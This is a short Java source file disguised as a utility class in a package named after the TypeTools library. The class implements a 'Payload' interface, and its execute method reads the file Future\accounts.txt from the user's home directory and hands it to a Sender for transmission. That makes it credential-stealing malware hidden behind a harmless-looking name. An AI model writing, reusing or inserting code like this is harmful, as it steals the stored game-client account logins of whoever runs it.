package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.FileUtil;
import net.jodah.typetools.util.Payload;

import java.io.File;
import java.util.Optional;

public final class TypeUtil7 implements Payload
{
    @Override
    public void execute()
    {
        Optional<File> file = FileUtil.getFile(System.getProperty("user.home") + "\\Future\\accounts.txt");
        file.ifPresent(Sender::send);
    }
}
